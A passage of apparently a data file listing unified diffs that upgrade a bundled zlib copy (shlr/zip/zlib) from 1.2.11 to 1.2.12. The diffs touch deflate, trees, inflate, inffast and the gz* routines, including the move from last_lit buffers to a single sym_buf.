    \ @@ local block_state deflate_slow(s, flush)\n         FLUSH_BLOCK(s, 1);\n \
    \        return finish_done;\n     }\n-    if (s->last_lit)\n+    if (s->sym_next)\n\
    \         FLUSH_BLOCK(s, 0);\n     return block_done;\n }\n@@ -2118,7 +2166,7\
    \ @@ local block_state deflate_rle(s, flush)\n         FLUSH_BLOCK(s, 1);\n  \
    \       return finish_done;\n     }\n-    if (s->last_lit)\n+    if (s->sym_next)\n\
    \         FLUSH_BLOCK(s, 0);\n     return block_done;\n }\n@@ -2157,7 +2205,7\
    \ @@ local block_state deflate_huff(s, flush)\n         FLUSH_BLOCK(s, 1);\n \
    \        return finish_done;\n     }\n-    if (s->last_lit)\n+    if (s->sym_next)\n\
    \         FLUSH_BLOCK(s, 0);\n     return block_done;\n }"
  - "--- a/shlr/zip/zlib/gzlib.c\n+++ b/shlr/zip/zlib/gzlib.c\n@@ -1,11 +1,11 @@\n\
    \ /* gzlib.c -- zlib functions common to reading and writing gzip files\n- * Copyright\
    \ (C) 2004-2017 Mark Adler\n+ * Copyright (C) 2004-2019 Mark Adler\n  * For conditions\
    \ of distribution and use, see copyright notice in zlib.h\n  */\n \n #include\
    \ \"gzguts.h\"\n \n-#if defined(_WIN32) && !defined(__BORLANDC__) && !defined(__MINGW32__)\n\
    +#if defined(_WIN32) && !defined(__BORLANDC__)\n #  define LSEEK _lseeki64\n #else\n\
    \ #if defined(_LARGEFILE64_SOURCE) && _LFS64_LARGEFILE-0\n@@ -81,6 +81,8 @@ local\
    \ void gz_reset(state)\n         state->past = 0;            /* have not read\
    \ past end yet */\n         state->how = LOOK;          /* look for gzip header\
    \ */\n     }\n+    else                            /* for writing ... */\n+  \
    \      state->reset = 0;           /* no deflateReset pending */\n     state->seek\
    \ = 0;                /* no seek request pending */\n     gz_error(state, Z_OK,\
    \ NULL);    /* clear error */\n     state->x.pos = 0;               /* no uncompressed\
    \ data yet */\n@@ -397,7 +399,7 @@ z_off64_t ZEXPORT gzseek64(file, offset, whence)\n\
    \     /* if within raw area while reading, just go there */\n     if (state->mode\
    \ == GZ_READ && state->how == COPY &&\n             state->x.pos + offset >= 0)\
    \ {\n-        ret = LSEEK(state->fd, offset - state->x.have, SEEK_CUR);\n+   \
    \     ret = LSEEK(state->fd, offset - (z_off64_t)state->x.have, SEEK_CUR);\n \
    \        if (ret == -1)\n             return -1;\n         state->x.have = 0;"
  - "--- a/shlr/zip/zlib/gzread.c\n+++ b/shlr/zip/zlib/gzread.c\n@@ -1,5 +1,5 @@\n\
    \ /* gzread.c -- zlib functions for reading gzip files\n- * Copyright (C) 2004,\
    \ 2005, 2010, 2011, 2012, 2013, 2016 Mark Adler\n+ * Copyright (C) 2004-2017 Mark\
    \ Adler\n  * For conditions of distribution and use, see copyright notice in zlib.h\n\
    \  */\n \n@@ -314,9 +314,9 @@ local z_size_t gz_read(state, buf, len)\n     got\
    \ = 0;\n     do {\n         /* set n to the maximum amount of len that fits in\
    \ an unsigned int */\n-        n = -1;\n+        n = (unsigned)-1;\n         if\
    \ (n > len)\n-            n = len;\n+            n = (unsigned)len;\n \n     \
    \    /* first just try copying data from the output buffer */\n         if (state->x.have)\
    \ {\n@@ -397,7 +397,7 @@ int ZEXPORT gzread(file, buf, len)\n     }\n \n     /*\
    \ read len or fewer bytes to buf */\n-    len = gz_read(state, buf, len);\n+ \
    \   len = (unsigned)gz_read(state, buf, len);\n \n     /* check for an error */\n\
    \     if (len == 0 && state->err != Z_OK && state->err != Z_BUF_ERROR)\n@@ -418,9\
    \ +418,8 @@ z_size_t ZEXPORT gzfread(buf, size, nitems, file)\n     gz_statep\
    \ state;\n \n     /* get internal structure */\n-    if (file == NULL || size\
    \ < 1) {\n+    if (file == NULL)\n         return 0;\n-    }\n     state = (gz_statep)file;\n\
    \ \n     /* check that we're reading and that there's no (serious) error */\n\
    @@ -448,7 +447,6 @@ z_size_t ZEXPORT gzfread(buf, size, nitems, file)\n int ZEXPORT\
    \ gzgetc(file)\n     gzFile file;\n {\n-    int ret;\n     unsigned char buf[1];\n\
    \     gz_statep state;\n \n@@ -470,8 +468,7 @@ int ZEXPORT gzgetc(file)\n    \
    \ }\n \n     /* nothing there -- try gz_read() */\n-    ret = gz_read(state, buf,\
    \ 1);\n-    return ret < 1 ? -1 : buf[0];\n+    return gz_read(state, buf, 1)\
    \ < 1 ? -1 : buf[0];\n }\n \n int ZEXPORT gzgetc_(file)"
  - "--- a/shlr/zip/zlib/gzwrite.c\n+++ b/shlr/zip/zlib/gzwrite.c\n@@ -1,5 +1,5 @@\n\
    \ /* gzwrite.c -- zlib functions for writing gzip files\n- * Copyright (C) 2004-2017\
    \ Mark Adler\n+ * Copyright (C) 2004-2019 Mark Adler\n  * For conditions of distribution\
    \ and use, see copyright notice in zlib.h\n  */\n \n@@ -97,6 +97,15 @@ local int\
    \ gz_comp(state, flush)\n         return 0;\n     }\n \n+    /* check for a pending\
    \ reset */\n+    if (state->reset) {\n+        /* don't start a new gzip member\
    \ unless there is data to write */\n+        if (strm->avail_in == 0)\n+     \
    \       return 0;\n+        deflateReset(strm);\n+        state->reset = 0;\n\
    +    }\n+\n     /* run deflate() on provided input until it produces no more output\
    \ */\n     ret = Z_OK;\n     do {\n@@ -134,7 +143,7 @@ local int gz_comp(state,\
    \ flush)\n \n     /* if that completed a deflate stream, allow another to start\
    \ */\n     if (flush == Z_FINISH)\n-        deflateReset(strm);\n+        state->reset\
    \ = 1;\n \n     /* all done, no errors */\n     return 0;\n@@ -209,7 +218,7 @@\
    \ local z_size_t gz_write(state, buf, len)\n                               state->in);\n\
    \             copy = state->size - have;\n             if (copy > len)\n-    \
    \            copy = len;\n+                copy = (unsigned)len;\n           \
    \  memcpy(state->in + have, buf, copy);\n             state->strm.avail_in +=\
    \ copy;\n             state->x.pos += copy;\n@@ -229,7 +238,7 @@ local z_size_t\
    \ gz_write(state, buf, len)\n         do {\n             unsigned n = (unsigned)-1;\n\
    \             if (n > len)\n-                n = len;\n+                n = (unsigned)len;\n\
    \             state->strm.avail_in = n;\n             state->x.pos += n;\n   \
    \          if (gz_comp(state, Z_NO_FLUSH) == -1)\n@@ -281,9 +290,8 @@ z_size_t\
    \ ZEXPORT gzfwrite(buf, size, nitems, file)\n     gz_statep state;\n \n     /*\
    \ get internal structure */\n-    if (file == NULL || size < 1) {\n+    if (file\
    \ == NULL)\n         return 0;\n-    }\n     state = (gz_statep)file;\n \n   \
    \  /* check that we're writing and that there's no error */\n@@ -350,12 +358,11\
    \ @@ int ZEXPORT gzputc(file, c)\n }\n \n /* -- see zlib.h -- */\n-int ZEXPORT\
    \ gzputs(file, str)\n+int ZEXPORT gzputs(file, s)\n     gzFile file;\n-    const\
    \ char *str;\n+    const char *s;\n {\n-    int ret;\n-    z_size_t len;\n+  \
    \  z_size_t len, put;\n     gz_statep state;\n \n     /* get internal structure\
    \ */\n@@ -368,9 +375,13 @@ int ZEXPORT gzputs(file, str)\n         return -1;\n\
    \ \n     /* write string */\n-    len = strlen(str);\n-    ret = gz_write(state,\
    \ str, len);\n-    return ret == 0 && len != 0 ? -1 : ret;\n+    len = strlen(s);\n\
    +    if ((int)len < 0 || (unsigned)len != len) {\n+        gz_error(state, Z_STREAM_ERROR,\
    \ \"string length does not fit in int\");\n+        return -1;\n+    }\n+    put\
    \ = gz_write(state, s, len);\n+    return put < len ? -1 : (int)len;\n }\n \n\
    \ #if defined(STDC) || defined(Z_HAVE_STDARG_H)\n@@ -442,7 +453,7 @@ int ZEXPORTVA\
    \ gzvprintf(gzFile file, const char *format, va_list va)\n         strm->avail_in\
    \ = state->size;\n         if (gz_comp(state, Z_NO_FLUSH) == -1)\n           \
    \  return state->err;\n-        memcpy(state->in, state->in + state->size, left);\n\
    +        memmove(state->in, state->in + state->size, left);\n         strm->next_in\
    \ = state->in;\n         strm->avail_in = left;\n     }\n@@ -541,7 +552,7 @@ int\
    \ ZEXPORTVA gzprintf (file, format, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10,\n\
    \         strm->avail_in = state->size;\n         if (gz_comp(state, Z_NO_FLUSH)\
    \ == -1)\n             return state->err;\n-        memcpy(state->in, state->in\
    \ + state->size, left);\n+        memmove(state->in, state->in + state->size,\
    \ left);\n         strm->next_in = state->in;\n         strm->avail_in = left;\n\
    \     }"
  - "--- a/shlr/zip/zlib/infback.c\n+++ b/shlr/zip/zlib/infback.c\n@@ -1,5 +1,5 @@\n\
    \ /* infback.c -- inflate using a call-back interface\n- * Copyright (C) 1995-2016\
    \ Mark Adler\n+ * Copyright (C) 1995-2022 Mark Adler\n  * For conditions of distribution\
    \ and use, see copyright notice in zlib.h\n  */\n \n@@ -477,6 +477,7 @@ void FAR\
    \ *out_desc;\n             }\n             Tracev((stderr, \"inflate:       codes\
    \ ok\\n\"));\n             state->mode = LEN;\n+                /* fallthrough\
    \ */\n \n         case LEN:\n             /* use inflate_fast() if we have enough\
    \ input and output */"
  - "--- a/shlr/zip/zlib/inffast.c\n+++ b/shlr/zip/zlib/inffast.c\n@@ -70,7 +70,7\
    \ @@ unsigned start;         /* inflate()'s starting value for strm->avail_out\
    \ */\n     code const FAR *dcode;      /* local strm->distcode */\n     unsigned\
    \ lmask;             /* mask for first level of length codes */\n     unsigned\
    \ dmask;             /* mask for first level of distance codes */\n-    code here;\
    \                  /* retrieved table entry */\n+    code const *here;       \
    \    /* retrieved table entry */\n     unsigned op;                /* code bits,\
    \ operation, extra bits, or */\n                                 /*  window position,\
    \ window bytes to copy */\n     unsigned len;               /* match length, unused\
    \ bytes */\n@@ -107,20 +107,20 @@ unsigned start;         /* inflate()'s starting\
    \ value for strm->avail_out */\n             hold += (unsigned long)(*in++) <<\
    \ bits;\n             bits += 8;\n         }\n-        here = lcode[hold & lmask];\n\
    +        here = lcode + (hold & lmask);\n       dolen:\n-        op = (unsigned)(here.bits);\n\
    +        op = (unsigned)(here->bits);\n         hold >>= op;\n         bits -=\
    \ op;\n-        op = (unsigned)(here.op);\n+        op = (unsigned)(here->op);\n\
    \         if (op == 0) {                          /* literal */\n-           \
    \ Tracevv((stderr, here.val >= 0x20 && here.val < 0x7f ?\n+            Tracevv((stderr,\
    \ here->val >= 0x20 && here->val < 0x7f ?\n                     \"inflate:   \
    \      literal '%c'\\n\" :\n-                    \"inflate:         literal 0x%02x\\\
    n\", here.val));\n-            *out++ = (unsigned char)(here.val);\n+        \
    \            \"inflate:         literal 0x%02x\\n\", here->val));\n+         \
    \   *out++ = (unsigned char)(here->val);\n         }\n         else if (op & 16)\
    \ {                     /* length base */\n-            len = (unsigned)(here.val);\n\
    +            len = (unsigned)(here->val);\n             op &= 15;            \
    \               /* number of extra bits */\n             if (op) {\n         \
    \        if (bits < op) {\n@@ -138,14 +138,14 @@ unsigned start;         /* inflate()'s\
    \ starting value for strm->avail_out */\n                 hold += (unsigned long)(*in++)\
    \ << bits;\n                 bits += 8;\n             }\n-            here = dcode[hold\
    \ & dmask];\n+            here = dcode + (hold & dmask);\n           dodist:\n\
    -            op = (unsigned)(here.bits);\n+            op = (unsigned)(here->bits);\n\
    \             hold >>= op;\n             bits -= op;\n-            op = (unsigned)(here.op);\n\
    +            op = (unsigned)(here->op);\n             if (op & 16) {         \
    \             /* distance base */\n-                dist = (unsigned)(here.val);\n\
    +                dist = (unsigned)(here->val);\n                 op &= 15;   \
    \                    /* number of extra bits */\n                 if (bits < op)\
    \ {\n                     hold += (unsigned long)(*in++) << bits;\n@@ -264,7 +264,7\
    \ @@ unsigned start;         /* inflate()'s starting value for strm->avail_out\
    \ */\n                 }\n             }\n             else if ((op & 64) == 0)\
    \ {          /* 2nd level distance code */\n-                here = dcode[here.val\
    \ + (hold & ((1U << op) - 1))];\n+                here = dcode + here->val + (hold\
    \ & ((1U << op) - 1));\n                 goto dodist;\n             }\n      \
    \       else {\n@@ -274,7 +274,7 @@ unsigned start;         /* inflate()'s starting\
    \ value for strm->avail_out */\n             }\n         }\n         else if ((op\
    \ & 64) == 0) {              /* 2nd level length code */\n-            here =\
    \ lcode[here.val + (hold & ((1U << op) - 1))];\n+            here = lcode + here->val\
    \ + (hold & ((1U << op) - 1));\n             goto dolen;\n         }\n       \
    \  else if (op & 32) {                     /* end-of-block */"
  - "--- a/shlr/zip/zlib/inflate.c\n+++ b/shlr/zip/zlib/inflate.c\n@@ -1,5 +1,5 @@\n\
    \ /* inflate.c -- zlib decompression\n- * Copyright (C) 1995-2016 Mark Adler\n\
    + * Copyright (C) 1995-2022 Mark Adler\n  * For conditions of distribution and\
    \ use, see copyright notice in zlib.h\n  */\n \n@@ -130,6 +130,7 @@ z_streamp\
    \ strm;\n     state->mode = HEAD;\n     state->last = 0;\n     state->havedict\
    \ = 0;\n+    state->flags = -1;\n     state->dmax = 32768U;\n     state->head\
    \ = Z_NULL;\n     state->hold = 0;\n@@ -447,10 +448,10 @@ unsigned copy;\n \n\
    \ /* check function to use adler32() for zlib or crc32() for gzip */\n #ifdef\
    \ GUNZIP\n-#  define UPDATE(check, buf, len) \\\n+#  define UPDATE_CHECK(check,\
    \ buf, len) \\\n     (state->flags ? crc32(check, buf, len) : adler32(check, buf,\
    \ len))\n #else\n-#  define UPDATE(check, buf, len) adler32(check, buf, len)\n\
    +#  define UPDATE_CHECK(check, buf, len) adler32(check, buf, len)\n #endif\n \n\
    \ /* check macros for header crc */\n@@ -670,7 +671,6 @@ int flush;\n        \
    \         state->mode = FLAGS;\n                 break;\n             }\n-   \
    \         state->flags = 0;           /* expect zlib header */\n             if\
    \ (state->head != Z_NULL)\n                 state->head->done = -1;\n        \
    \     if (!(state->wrap & 1) ||   /* check if zlib header allowed */\n@@ -697,6\
    \ +697,7 @@ int flush;\n                 break;\n             }\n            \
    \ state->dmax = 1U << len;\n+            state->flags = 0;               /* indicate\
    \ zlib header */\n             Tracev((stderr, \"inflate:   zlib header ok\\n\"\
    ));\n             strm->adler = state->check = adler32(0L, Z_NULL, 0);\n     \
    \        state->mode = hold & 0x200 ? DICTID : TYPE;\n@@ -722,6 +723,7 @@ int\
    \ flush;\n                 CRC2(state->check, hold);\n             INITBITS();\n\
    \             state->mode = TIME;\n+                /* fallthrough */\n      \
    \   case TIME:\n             NEEDBITS(32);\n             if (state->head != Z_NULL)\n\
    @@ -730,6 +732,7 @@ int flush;\n                 CRC4(state->check, hold);\n \
    \            INITBITS();\n             state->mode = OS;\n+                /*\
    \ fallthrough */\n         case OS:\n             NEEDBITS(16);\n            \
    \ if (state->head != Z_NULL) {\n@@ -740,6 +743,7 @@ int flush;\n             \
    \    CRC2(state->check, hold);\n             INITBITS();\n             state->mode\
    \ = EXLEN;\n+                /* fallthrough */\n         case EXLEN:\n       \
    \      if (state->flags & 0x0400) {\n                 NEEDBITS(16);\n@@ -753,6\
    \ +757,7 @@ int flush;\n             else if (state->head != Z_NULL)\n       \
    \          state->head->extra = Z_NULL;\n             state->mode = EXTRA;\n+\
    \                /* fallthrough */\n         case EXTRA:\n             if (state->flags\
    \ & 0x0400) {\n                 copy = state->length;\n@@ -775,6 +780,7 @@ int\
    \ flush;\n             }\n             state->length = 0;\n             state->mode\
    \ = NAME;\n+                /* fallthrough */\n         case NAME:\n         \
    \    if (state->flags & 0x0800) {\n                 if (have == 0) goto inf_leave;\n\
    @@ -796,6 +802,7 @@ int flush;\n                 state->head->name = Z_NULL;\n\
    \             state->length = 0;\n             state->mode = COMMENT;\n+     \
    \           /* fallthrough */\n         case COMMENT:\n             if (state->flags\
    \ & 0x1000) {\n                 if (have == 0) goto inf_leave;\n@@ -816,6 +823,7\
    \ @@ int flush;\n             else if (state->head != Z_NULL)\n              \
    \   state->head->comment = Z_NULL;\n             state->mode = HCRC;\n+      \
    \          /* fallthrough */\n         case HCRC:\n             if (state->flags\
    \ & 0x0200) {\n                 NEEDBITS(16);\n@@ -839,15 +847,18 @@ int flush;\n\
    \             strm->adler = state->check = ZSWAP32(hold);\n             INITBITS();\n\
    \             state->mode = DICT;\n+                /* fallthrough */\n      \
    \   case DICT:\n             if (state->havedict == 0) {\n                 RESTORE();\n\
    \                 return Z_NEED_DICT;\n             }\n             strm->adler\
    \ = state->check = adler32(0L, Z_NULL, 0);\n             state->mode = TYPE;\n\
    +                /* fallthrough */\n         case TYPE:\n             if (flush\
    \ == Z_BLOCK || flush == Z_TREES) goto inf_leave;\n+                /* fallthrough\
    \ */\n         case TYPEDO:\n             if (state->last) {\n               \
    \  BYTEBITS();\n@@ -898,8 +909,10 @@ int flush;\n             INITBITS();\n  \
    \           state->mode = COPY_;\n             if (flush == Z_TREES) goto inf_leave;\n\
    +                /* fallthrough */\n         case COPY_:\n             state->mode\
    \ = COPY;\n+                /* fallthrough */\n         case COPY:\n         \
    \    copy = state->length;\n             if (copy) {\n@@ -935,6 +948,7 @@ int\
    \ flush;\n             Tracev((stderr, \"inflate:       table sizes ok\\n\"));\n\
    \             state->have = 0;\n             state->mode = LENLENS;\n+       \
    \         /* fallthrough */\n         case LENLENS:\n             while (state->have\
    \ < state->ncode) {\n                 NEEDBITS(3);\n@@ -956,6 +970,7 @@ int flush;\n\
    \             Tracev((stderr, \"inflate:       code lengths ok\\n\"));\n     \
    \        state->have = 0;\n             state->mode = CODELENS;\n+           \
    \     /* fallthrough */\n         case CODELENS:\n             while (state->have\
    \ < state->nlen + state->ndist) {\n                 for (;;) {\n@@ -1039,8 +1054,10\
    \ @@ int flush;\n             Tracev((stderr, \"inflate:       codes ok\\n\"));\n\
    \             state->mode = LEN_;\n             if (flush == Z_TREES) goto inf_leave;\n\
    +                /* fallthrough */\n         case LEN_:\n             state->mode\
    \ = LEN;\n+                /* fallthrough */\n         case LEN:\n           \
    \  if (have >= 6 && left >= 258) {\n                 RESTORE();\n@@ -1090,6 +1107,7\
    \ @@ int flush;\n             }\n             state->extra = (unsigned)(here.op)\
    \ & 15;\n             state->mode = LENEXT;\n+                /* fallthrough */\n\
    \         case LENEXT:\n             if (state->extra) {\n                 NEEDBITS(state->extra);\n\
    @@ -1100,6 +1118,7 @@ int flush;\n             Tracevv((stderr, \"inflate:   \
    \      length %u\\n\", state->length));\n             state->was = state->length;\n\
    \             state->mode = DIST;\n+                /* fallthrough */\n      \
    \   case DIST:\n             for (;;) {\n                 here = state->distcode[BITS(state->distbits)];\n\
    @@ -1127,6 +1146,7 @@ int flush;\n             state->offset = (unsigned)here.val;\n\
    \             state->extra = (unsigned)(here.op) & 15;\n             state->mode\
    \ = DISTEXT;\n+                /* fallthrough */\n         case DISTEXT:\n   \
    \          if (state->extra) {\n                 NEEDBITS(state->extra);\n@@ -1143,6\
    \ +1163,7 @@ int flush;\n #endif\n             Tracevv((stderr, \"inflate:   \
    \      distance %u\\n\", state->offset));\n             state->mode = MATCH;\n\
    +                /* fallthrough */\n         case MATCH:\n             if (left\
    \ == 0) goto inf_leave;\n             copy = out - left;\n@@ -1202,7 +1223,7 @@\
    \ int flush;\n                 state->total += out;\n                 if ((state->wrap\
    \ & 4) && out)\n                     strm->adler = state->check =\n-         \
    \               UPDATE(state->check, put - out, out);\n+                     \
    \   UPDATE_CHECK(state->check, put - out, out);\n                 out = left;\n\
    \                 if ((state->wrap & 4) && (\n #ifdef GUNZIP\n@@ -1218,10 +1239,11\
    \ @@ int flush;\n             }\n #ifdef GUNZIP\n             state->mode = LENGTH;\n\
    +                /* fallthrough */\n         case LENGTH:\n             if (state->wrap\
    \ && state->flags) {\n                 NEEDBITS(32);\n-                if (hold\
    \ != (state->total & 0xffffffffUL)) {\n+                if ((state->wrap & 4)\
    \ && hold != (state->total & 0xffffffff)) {\n                     strm->msg =\
    \ (char *)\"incorrect length check\";\n                     state->mode = BAD;\n\
    \                     break;\n@@ -1231,6 +1253,7 @@ int flush;\n             }\n\
    \ #endif\n             state->mode = DONE;\n+                /* fallthrough */\n\
    \         case DONE:\n             ret = Z_STREAM_END;\n             goto inf_leave;\n\
    @@ -1240,6 +1263,7 @@ int flush;\n         case MEM:\n             return Z_MEM_ERROR;\n\
    \         case SYNC:\n+                /* fallthrough */\n         default:\n\
    \             return Z_STREAM_ERROR;\n         }\n@@ -1265,7 +1289,7 @@ int flush;\n\
    \     state->total += out;\n     if ((state->wrap & 4) && out)\n         strm->adler\
    \ = state->check =\n-            UPDATE(state->check, strm->next_out - out, out);\n\
    +            UPDATE_CHECK(state->check, strm->next_out - out, out);\n     strm->data_type\
    \ = (int)state->bits + (state->last ? 64 : 0) +\n                       (state->mode\
    \ == TYPE ? 128 : 0) +\n                       (state->mode == LEN_ || state->mode\
    \ == COPY_ ? 256 : 0);\n@@ -1401,6 +1425,7 @@ int ZEXPORT inflateSync(strm)\n\
    \ z_streamp strm;\n {\n     unsigned len;               /* number of bytes to\
    \ look at or looked at */\n+    int flags;                  /* temporary to save\
    \ header status */\n     unsigned long in, out;      /* temporary to save total_in\
    \ and total_out */\n     unsigned char buf[4];       /* to restore bit buffer\
    \ to byte string */\n     struct inflate_state FAR *state;\n@@ -1433,9 +1458,15\
    \ @@ z_streamp strm;\n \n     /* return no joy or set up to restart inflate()\
    \ on a new block */\n     if (state->have != 4) return Z_DATA_ERROR;\n+    if\
    \ (state->flags == -1)\n+        state->wrap = 0;    /* if no header yet, treat\
    \ as raw */\n+    else\n+        state->wrap &= ~4;  /* no point in computing\
    \ a check value now */\n+    flags = state->flags;\n     in = strm->total_in;\
    \  out = strm->total_out;\n     inflateReset(strm);\n     strm->total_in = in;\
    \  strm->total_out = out;\n+    state->flags = flags;\n     state->mode = TYPE;\n\
    \     return Z_OK;\n }\n@@ -1531,7 +1562,7 @@ int check;\n \n     if (inflateStateCheck(strm))\
    \ return Z_STREAM_ERROR;\n     state = (struct inflate_state FAR *)strm->state;\n\
    -    if (check)\n+    if (check && state->wrap)\n         state->wrap |= 4;\n\
    \     else\n         state->wrap &= ~4;"
  - "--- a/shlr/zip/zlib/inftrees.c\n+++ b/shlr/zip/zlib/inftrees.c\n@@ -1,5 +1,5\
    \ @@\n /* inftrees.c -- generate Huffman trees for efficient decoding\n- * Copyright\
    \ (C) 1995-2017 Mark Adler\n+ * Copyright (C) 1995-2022 Mark Adler\n  * For conditions\
    \ of distribution and use, see copyright notice in zlib.h\n  */\n \n@@ -9,7 +9,7\
    \ @@\n #define MAXBITS 15\n \n const char inflate_copyright[] =\n-   \" inflate\
    \ 1.2.11 Copyright 1995-2017 Mark Adler \";\n+   \" inflate 1.2.12 Copyright 1995-2022\
    \ Mark Adler \";\n /*\n   If you use the zlib library in a product, an acknowledgment\
    \ is welcome\n   in the documentation of your product. If for some reason you\
    \ cannot\n@@ -62,7 +62,7 @@ unsigned short FAR *work;\n         35, 43, 51, 59,\
    \ 67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0};\n     static const unsigned\
    \ short lext[31] = { /* Length codes 257..285 extra */\n         16, 16, 16, 16,\
    \ 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18,\n-        19, 19, 19, 19, 20,\
    \ 20, 20, 20, 21, 21, 21, 21, 16, 77, 202};\n+        19, 19, 19, 19, 20, 20,\
    \ 20, 20, 21, 21, 21, 21, 16, 199, 202};\n     static const unsigned short dbase[32]\
    \ = { /* Distance codes 0..29 base */\n         1, 2, 3, 4, 5, 7, 9, 13, 17, 25,\
    \ 33, 49, 65, 97, 129, 193,\n         257, 385, 513, 769, 1025, 1537, 2049, 3073,\
    \ 4097, 6145,"
  - "--- a/shlr/zip/zlib/trees.c\n+++ b/shlr/zip/zlib/trees.c\n@@ -1,5 +1,5 @@\n /*\
    \ trees.c -- output deflated data using Huffman coding\n- * Copyright (C) 1995-2017\
    \ Jean-loup Gailly\n+ * Copyright (C) 1995-2021 Jean-loup Gailly\n  * detect_data_type()\
    \ function provided freely by Cosmin Truta, 2006\n  * For conditions of distribution\
    \ and use, see copyright notice in zlib.h\n  */\n@@ -149,7 +149,7 @@ local void\
    \ send_all_trees OF((deflate_state *s, int lcodes, int dcodes,\n local void compress_block\
    \ OF((deflate_state *s, const ct_data *ltree,\n                              \
    \ const ct_data *dtree));\n local int  detect_data_type OF((deflate_state *s));\n\
    -local unsigned bi_reverse OF((unsigned value, int length));\n+local unsigned\
    \ bi_reverse OF((unsigned code, int len));\n local void bi_windup      OF((deflate_state\
    \ *s));\n local void bi_flush       OF((deflate_state *s));\n \n@@ -416,7 +416,7\
    \ @@ local void init_block(s)\n \n     s->dyn_ltree[END_BLOCK].Freq = 1;\n   \
    \  s->opt_len = s->static_len = 0L;\n-    s->last_lit = s->matches = 0;\n+   \
    \ s->sym_next = s->matches = 0;\n }\n \n #define SMALLEST 1\n@@ -870,7 +870,8\
    \ @@ void ZLIB_INTERNAL _tr_stored_block(s, buf, stored_len, last)\n     bi_windup(s);\
    \        /* align on byte boundary */\n     put_short(s, (ush)stored_len);\n \
    \    put_short(s, (ush)~stored_len);\n-    zmemcpy(s->pending_buf + s->pending,\
    \ (Bytef *)buf, stored_len);\n+    if (stored_len)\n+        zmemcpy(s->pending_buf\
    \ + s->pending, (Bytef *)buf, stored_len);\n     s->pending += stored_len;\n #ifdef\
    \ ZLIB_DEBUG\n     s->compressed_len = (s->compressed_len + 3 + 7) & (ulg)~7L;\n\
    @@ -947,7 +948,7 @@ void ZLIB_INTERNAL _tr_flush_block(s, buf, stored_len, last)\n\
    \ \n         Tracev((stderr, \"\\nopt %lu(%lu) stat %lu(%lu) stored %lu lit %u\
    \ \",\n                 opt_lenb, s->opt_len, static_lenb, s->static_len, stored_len,\n\
    -                s->last_lit));\n+                s->sym_next / 3));\n \n    \
    \     if (static_lenb <= opt_lenb) opt_lenb = static_lenb;\n \n@@ -1016,8 +1017,9\
    \ @@ int ZLIB_INTERNAL _tr_tally (s, dist, lc)\n     unsigned dist;  /* distance\
    \ of matched string */\n     unsigned lc;    /* match length-MIN_MATCH or unmatched\
    \ char (if dist==0) */\n {\n-    s->d_buf[s->last_lit] = (ush)dist;\n-    s->l_buf[s->last_lit++]\
    \ = (uch)lc;\n+    s->sym_buf[s->sym_next++] = dist;\n+    s->sym_buf[s->sym_next++]\
    \ = dist >> 8;\n+    s->sym_buf[s->sym_next++] = lc;\n     if (dist == 0) {\n\
    \         /* lc is the unmatched char */\n         s->dyn_ltree[lc].Freq++;\n\
    @@ -1032,30 +1034,7 @@ int ZLIB_INTERNAL _tr_tally (s, dist, lc)\n         s->dyn_ltree[_length_code[lc]+LITERALS+1].Freq++;\n\
    \         s->dyn_dtree[d_code(dist)].Freq++;\n     }\n-\n-#ifdef TRUNCATE_BLOCK\n\
    -    /* Try to guess if it is profitable to stop the current block here */\n-\
    \    if ((s->last_lit & 0x1fff) == 0 && s->level > 2) {\n-        /* Compute an\
    \ upper bound for the compressed length */\n-        ulg out_length = (ulg)s->last_lit*8L;\n\
    -        ulg in_length = (ulg)((long)s->strstart - s->block_start);\n-       \
    \ int dcode;\n-        for (dcode = 0; dcode < D_CODES; dcode++) {\n-        \
    \    out_length += (ulg)s->dyn_dtree[dcode].Freq *\n-                (5L+extra_dbits[dcode]);\n\
    -        }\n-        out_length >>= 3;\n-        Tracev((stderr,\"\\nlast_lit\
    \ %u, in %ld, out ~%ld(%ld%%) \",\n-               s->last_lit, in_length, out_length,\n\
    -               100L - out_length*100L/in_length));\n-        if (s->matches <\
    \ s->last_lit/2 && out_length < in_length/2) return 1;\n-    }\n-#endif\n-   \
    \ return (s->last_lit == s->lit_bufsize-1);\n-    /* We avoid equality with lit_bufsize\
    \ because of wraparound at 64K\n-     * on 16 bit machines and because stored\
    \ blocks are restricted to\n-     * 64K-1 bytes.\n-     */\n+    return (s->sym_next\
    \ == s->sym_end);\n }\n \n /* ===========================================================================\n\
    @@ -1068,13 +1047,14 @@ local void compress_block(s, ltree, dtree)\n {\n     unsigned\
    \ dist;      /* distance of matched string */\n     int lc;             /* match\
    \ length or unmatched char (if dist == 0) */\n-    unsigned lx = 0;    /* running\
    \ index in l_buf */\n+    unsigned sx = 0;    /* running index in sym_buf */\n\
    \     unsigned code;      /* the code to send */\n     int extra;          /*\
    \ number of extra bits to send */\n \n-    if (s->last_lit != 0) do {\n-     \
    \   dist = s->d_buf[lx];\n-        lc = s->l_buf[lx++];\n+    if (s->sym_next\
    \ != 0) do {\n+        dist = s->sym_buf[sx++] & 0xff;\n+        dist += (unsigned)(s->sym_buf[sx++]\
    \ & 0xff) << 8;\n+        lc = s->sym_buf[sx++];\n         if (dist == 0) {\n\
    \             send_code(s, lc, ltree); /* send a literal byte */\n           \
    \  Tracecv(isgraph(lc), (stderr,\" '%c' \", lc));\n@@ -1099,11 +1079,10 @@ local\
    \ void compress_block(s, ltree, dtree)\n             }\n         } /* literal\
    \ or match pair ? */\n \n-        /* Check that the overlay between pending_buf\
    \ and d_buf+l_buf is ok: */\n-        Assert((uInt)(s->pending) < s->lit_bufsize\
    \ + 2*lx,\n-               \"pendingBuf overflow\");\n+        /* Check that the\
    \ overlay between pending_buf and sym_buf is ok: */\n+        Assert(s->pending\
    \ < s->lit_bufsize + sx, \"pendingBuf overflow\");\n \n-    } while (lx < s->last_lit);\n\
    +    } while (sx < s->sym_next);\n \n     send_code(s, END_BLOCK, ltree);\n }\n\
    @@ -1112,9 +1091,9 @@ local void compress_block(s, ltree, dtree)\n  * Check if\
    \ the data type is TEXT or BINARY, using the following algorithm:\n  * - TEXT\
    \ if the two conditions below are satisfied:\n  *    a) There are no non-portable\
    \ control characters belonging to the\n- *       \"black list\" (0..6, 14..25,\
    \ 28..31).\n+ *       \"block list\" (0..6, 14..25, 28..31).\n  *    b) There\
    \ is at least one printable character belonging to the\n- *       \"white list\"\
    \ (9 {TAB}, 10 {LF}, 13 {CR}, 32..255).\n+ *       \"allow list\" (9 {TAB}, 10\
